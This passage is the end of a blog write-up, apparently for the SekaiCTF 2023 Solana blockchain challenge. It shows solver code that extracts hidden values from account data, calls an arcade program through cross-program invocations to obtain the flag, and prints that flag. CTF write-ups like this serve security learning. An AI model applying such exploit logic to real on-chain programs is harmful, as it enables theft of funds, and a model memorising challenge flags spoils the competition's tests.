</span></span><span class="line"><span class="cl">			<span class="n">stuckInGap</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x60</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x2c</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">atBottom</span> <span class="o">|=</span> <span class="kt">uint64</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mh">0x24</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x78</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mh">0x78</span><span class="p">]</span> <span class="o">=</span> <span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">lookForIt</span> <span class="o">=</span> <span class="kt">string</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint256</span> <span class="n">test</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x2c</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x4c</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">test</span> <span class="o">=</span> <span class="n">test</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="n">test</span> <span class="o">+=</span> <span class="kt">uint256</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">int8</span><span class="p">(</span><span class="n">ai</span><span class="p">.</span><span class="nb">data</span><span class="p">[</span><span class="n">i</span><span class="p">])));</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">somewhere</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">test</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;forgotten :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">forgotten</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;stuckInGap:{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">stuckInGap</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;atBottom  :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">atBottom</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;lookForIt :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">lookForIt</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="n">print</span><span class="p">(</span><span class="s">&#34;Somewhere :{}&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">somewhere</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kt">address</span> <span class="n">programId</span> <span class="o">=</span> <span class="kt">address</span><span class="s">&#39;ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeInterface</span> <span class="n">arcadeProgram</span> <span class="o">=</span> <span class="n">arcadeInterface</span><span class="p">(</span><span class="n">programId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">AccountMeta</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">metas</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">AccountMeta</span><span class="p">({</span><span class="n">pubkey</span><span class="o">:</span> <span class="n">ai</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">is_writable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="n">is_signer</span><span class="o">:</span> <span class="kc">false</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">find_string_uint64</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}(</span><span class="s">&#34;Token Dispenser&#34;</span><span class="p">,</span> <span class="n">forgotten</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">find_string_uint64</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}(</span><span class="s">&#34;Token Counter&#34;</span><span class="p">,</span> <span class="n">stuckInGap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">find_string_uint64</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}(</span><span class="s">&#34;Arcade Machine&#34;</span><span class="p">,</span> <span class="n">atBottom</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">find_bytes32</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}(</span><span class="n">somewhere</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">find_string</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}(</span><span class="n">lookForIt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Hello solana - END&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">arcadeProgram</span><span class="p">.</span><span class="n">play</span><span class="p">{</span><span class="n">accounts</span><span class="o">:</span> <span class="n">metas</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After doing sequence of CPIs in the above code, we will be able to call <code>play</code> and the <code>arcade-server</code> will give us the flag :D.</p>
<img src="https://i.imgur.com/4f9VwNe.png"/>
<blockquote>
<p><strong>Flag: SEKAI{P13453_tAk3_C4r3_0f_Ur_t0k3n5_oR_Oth3r5_w1ll?}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/sekaictf-2023/" data-title="SekaiCTF 2023" data-via="Chovid99" data-hashtags="Writeup,SekaiCTF,blockchain,evm,solana,solang,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/sekaictf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/sekaictf/">SekaiCTF</a>,&nbsp;<a href="/tags/blockchain/">blockchain</a>,&nbsp;<a href="/tags/evm/">evm</a>,&nbsp;<a href="/tags/solana/">solana</a>,&nbsp;<a href="/tags/solang/">solang</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/corctf-2023/" class="prev" rel="prev" title="corCTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>corCTF 2023</a>
            <a href="/posts/hitcon-ctf-2023/" class="next" rel="next" title="HITCON CTF 2023">HITCON CTF 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
